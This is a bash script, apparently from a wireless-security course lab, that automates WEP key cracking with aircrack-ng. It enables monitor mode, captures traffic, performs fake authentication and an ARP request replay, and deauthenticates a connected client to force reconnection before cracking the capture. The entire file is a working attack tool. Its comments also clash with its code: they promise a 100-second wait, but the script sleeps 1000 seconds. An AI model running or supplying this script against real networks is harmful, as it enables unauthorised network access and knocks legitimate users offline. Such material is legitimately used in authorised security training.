#!/bin/bash

channel=$1
ESSID=$2
MAC_AP=$3
MAC_client=$4 

if [ $# != 4 ]
	then
	echo "[-] Error. Expected 4 parameters.
[+] Usage:
	bash WEP.sh <channel> <ESSID> <MAC_AP> <MAC_client>
	bash WEP.sh 1 WIFU 1C:7E:E5:32:C7:DE 00:c0:ca:72:90:55"
	exit
fi

# Place your card in monitor mode on the channel of the AP and start an Airodump capture
echo '[+] Setting wlan0 in monitor mode as VAP mon0'
airmon-ng start wlan0 $channel
#xterm -hold -e "airodump-ng -c $channel --bssid $MAC_AP -w WIFU mon0"
echo '[+] Starting traffic capture with aerodump'
airodump-ng -c $channel --bssid $MAC_AP -w WIFU mon0 2>/dev/null &

# Run a fake authentication against the access point and launch an  attack 3, the ARP request replay attack
echo '[+] Running Fake Authentication against the AP'
aireplay-ng -1 0 -e $ESSID -a $MAC_AP -h $MAC_client mon0
echo '[+] Running ARP request replay attack'
aireplay-ng -3 -b $MAC_AP -h $MAC_client mon0 2>/dev/null &

# Deauthenticate the client to force is to reconnect and send an ARP packet
aireplay-ng -0 1 -a $MAC_AP -c $MAC_client mon0

# Wait 100 seconds
echo '[+] Waiting 100 seconds before cracking the password'
sleep 1000
kill %1
kill %2

# Crack the capture using Aircrack-ng
aircrack-ng WIFU*.cap
